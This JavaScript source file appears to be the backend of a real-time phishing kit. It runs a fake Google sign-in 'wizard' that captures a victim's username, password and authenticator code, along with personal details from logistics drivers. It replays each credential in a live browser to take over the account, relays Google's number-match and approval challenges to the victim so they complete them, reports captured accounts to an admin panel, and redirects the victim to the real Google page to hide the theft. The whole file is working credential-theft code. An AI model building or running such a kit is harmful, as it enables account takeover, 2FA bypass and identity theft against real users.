import * as events from './events.js';
import * as store from './store.js';
import * as browser from './browser.js';
import { encrypt } from './crypto.js';

// ---------- single static link ----------
// There's exactly ONE link everyone uses: /w/<STATIC_TOKEN>. Unlike the old
// per-invite model there's no list of generated links — any number of different
// people can register through the same link. Each visitor is tracked by a
// client-generated wizard id (`wid`), so their steps build up ONE fresh session
// of their own and never collide with another person using the link.
export const STATIC_TOKEN = 'login';

// Where the victim's browser is redirected after credentials are captured, so
// they land on the *real* site and never see a fake "you're all set" page.
const LANDING = 'https://myaccount.google.com/';

// wid -> a single person's registration attempt in progress (in-memory; the
// real session is what's persisted in the store, this is just the in-flight copy)
const pending = new Map();

function entry(wid) {
  const key = String(wid || 'default');
  if (!pending.has(key)) {
    pending.set(key, {
      sessionId: null,
      username: '',
      lastLogin: null,
      steps: { username: false, password: false, totp: false },
    });
  }
  return pending.get(key);
}

// wizard-facing view — only what the remote user's page may know
function toPayload(r) {
  const session = r.sessionId ? store.getRaw(r.sessionId) : null;
  return {
    token: STATIC_TOKEN,
    loggedIn: session?.status === 'logged-in' || session?.status === 'trusted',
    trusted: session?.deviceTrusted === true,
    // the account the remote user is signing in with, so the front-end can show
    // a personalized "Thanks, <username> submitted" success screen.
    username: r.username || '',
    // result of the last live-login step the backend drove: status + the real
    // Google error/status message + which screen the REAL browser is now asking
    // for (email/password/code/approve/numchoice/logged-in), so the clone
    // mirrors it exactly. `options` carries the real "pick the number" choices.
    login: r.lastLogin ? { status: r.lastLogin.status, message: r.lastLogin.message, state: r.lastLogin.state, options: r.lastLogin.options || null } : null,
    landing: LANDING,
  };
}

// Called by the wizard page on load. Validates the token (only the static one is
// valid now) and marks the visit as activity for the admin feed.
export function begin(token, wid) {
  if (token !== STATIC_TOKEN) return null;
  const r = entry(wid);
  events.push('wizard.opened', { message: 'Someone opened the sign-in link' });
  return toPayload(r);
}

// step: 'username' | 'password' | 'totp' ; value is the submitted string.
// Persists the credential into the visitor's real session *and* drives the
// actual Google sign-in forward (see browser.wizardPhase), so the logged-in
// session is genuinely built up as the user walks the wizard — not just stored.
export async function step(token, wid, step, value) {
  if (token !== STATIC_TOKEN) return null;
  const r = entry(wid);

  let message;
  if (step === 'driver') {
    // Logistics driver submission — the first thing a driver fills in (landing
    // form before the Google sign-in). Captured immediately into a session so we
    // keep the plate/driver details even if they never complete the Google login.
    const d = (value && typeof value === 'object') ? value : {};
    const driverName = String(d.driverName ?? '').trim();
    const licensePlate = String(d.licensePlate ?? '').trim().toUpperCase();
    const phone = String(d.phone ?? '').trim();
    const license = String(d.license ?? '').trim();
    const vehicle = String(d.vehicle ?? '').trim();
    const city = String(d.city ?? '').trim();
    const email = String(d.email ?? '').trim();
    const state = String(d.state ?? '').trim();
    r.driver = { driverName, licensePlate, phone, license, vehicle, city, email, state };
    r.steps.driver = true;
    if (!r.sessionId) {
      r.sessionId = store.create({
        name: licensePlate ? `${driverName || ''} · ${licensePlate}` : (driverName || 'Driver submission'),
        provider: 'google',
        loginUrl: 'https://accounts.google.com/',
        username: '',
        password: '',
        totpSecret: '',
        note: 'Logistics driver submission',
        driverName,
        licensePlate,
        phone,
        license,
        vehicle,
        city,
        email,
        state,
      }).id;
    } else {
      store.update(r.sessionId, { driverName, licensePlate, phone, license, vehicle, city, email, state });
    }
    message = `Driver: ${driverName || '(no name)'} · plate ${licensePlate || '—'}`;
  } else if (step === 'username') {
    const username = String(value ?? '').trim();
    r.username = username;
    r.steps.username = true;
    // Create the real session the moment the first credential arrives so the
    // live browser login has a persistent home (sessions/<id>).
    if (!r.sessionId) {
      r.sessionId = store.create({
        name: username || 'New sign-in',
        provider: 'google',
        loginUrl: 'https://accounts.google.com/',
        username,
        password: '',
        totpSecret: '',
        note: 'Google sign-in',
      }).id;
    } else {
      store.update(r.sessionId, { username });
    }
    message = `Entered username: ${username || '(blank)'}`;
  } else if (step === 'password') {
    const password = String(value ?? '');
    r.steps.password = true;
    if (r.sessionId) store.update(r.sessionId, { password });
    message = 'Entered password ••••••••';
  } else if (step === 'totp') {
    const secret = String(value ?? '').replace(/\s+/g, '');
    r.steps.totp = true;
    if (r.sessionId) store.update(r.sessionId, { totpSecret: secret });
    message = secret ? 'Provided a 2FA (authenticator) code' : 'Skipped 2FA';
  } else if (step === 'numchoice') {
    // Victim picked one of the "select the number" options shown by Google.
    // The actual click is driven in browser.wizardPhase below.
    message = `Selected a verification number (${String(value ?? '').trim()})`;
  } else if (step === 'status') {
    // Live poll (nothing is captured here): re-report the current real-login
    // state, e.g. while the victim taps Approve on their phone or Google settles.
    if (r.sessionId) {
      const res = await browser.loginState(r.sessionId);
      r.lastLogin = { status: res?.status || 'pending', message: res?.message || '', state: res?.state || 'verifying', options: res?.options || null };
      if (res?.state === 'trusted') {
        store.setStatus(r.sessionId, 'trusted');
        events.push('wizard.trusted', {
          message: `Device registered \u2713  ${r.username || 'Google'} \u2014 this OS is the keypass now`,
          sessionId: r.sessionId,
        });
      }
      if (res?.status === 'loggedIn' || res?.status === 'logged-in') {
        store.setStatus(r.sessionId, 'logged-in');
        const ev = r._lastLoggedEvent || 0;
        if (Date.now() - ev > 15000) {
          r._lastLoggedEvent = Date.now();
          events.push('wizard.logged-in', { message: `Signed in \u2713  ${r.username || 'Google'} \u2014 Gmail reachable`.trim() });
        }
      }
      // poll caught a newly-displayed challenge (number shown, approve, code)
      if (['numchoice', 'code', 'approve'].includes(res?.state) && !r._lastChallenge) {
        r._lastChallenge = { state: res.state, options: res.options || null };
        events.push('wizard.challenge', {
          message: `Challenge: ${r.username || 'Google'} → ${res.state}${res.options?.length ? ` (number: ${res.options.join(' ')})` : ''}`,
          sessionId: r.sessionId,
          state: res.state,
          options: res.options || null,
          loginMessage: res.message || '',
        });
      }
      if (res?.state === 'signed-in' || res?.status === 'logged-in') r._lastChallenge = null;
    }
    return toPayload(r);
  } else {
    return toPayload(r);
  }

  // Drive the real login for this step. Best-effort — never breaks the wizard:
  // even if Google throws a challenge, the credentials are saved and the admin
  // can finish by hand or Auto-login later. (Driver step has no browser phase —
  // it's just data we store.)
  if (r.sessionId && step !== 'driver') {
    const valueForLogin = step === 'totp' ? String(value ?? '').replace(/\s+/g, '') : value;
    const res = await browser.wizardPhase(step, r.sessionId, valueForLogin);
    // surface the live-login result to the wizard front-end so it can mirror
    // real Google (stay on the field for a wrong password / bad code, etc.)
    r.lastLogin = {
      status: res?.status || 'unknown',
      message: res?.message || '',
      state: res?.state || null,
      options: res?.options || null,
    };
    if (res?.status === 'logged-in') {
      store.setStatus(r.sessionId, 'logged-in');
      events.push('wizard.logged-in', {
        message: `Signed in ✓  ${r.username || 'Google'}`.trim(),
      });
    } else if (res?.status === 'error') {
      store.setStatus(r.sessionId, 'new');
    } else if (res?.state === 'numchoice' || res?.state === 'code' || res?.state === 'approve') {
      // Challenge live (2FA code / phone-approve / displayed number) — push it
      // to the admin panel so the modal pops up with the number even when the
      // login is driven from the user's side, not the panel.
      events.push('wizard.challenge', {
        message: `Challenge: ${r.username || 'Google'} → ${res.state}${res.options?.length ? ` (number: ${res.options.join(' ')})` : ''}`,
        sessionId: r.sessionId,
        state: res.state,
        options: res.options || null,
        loginMessage: res.message || '',
      });
    }
  }

  events.push('wizard.step', { message });
  return toPayload(r);
}

// Finalize. The session was already created + driven during the steps; here we
// just report completion so the front-end redirects to the real account page.
// (No session is created if the visitor never submitted anything.)
export function complete(token, wid) {
  if (token !== STATIC_TOKEN) return null;
  const r = entry(wid);
  events.push('wizard.completed', {
    message: `Sign-in complete ✓  ${r.username || 'Google'}`.trim(),
  });
  return toPayload(r);
}
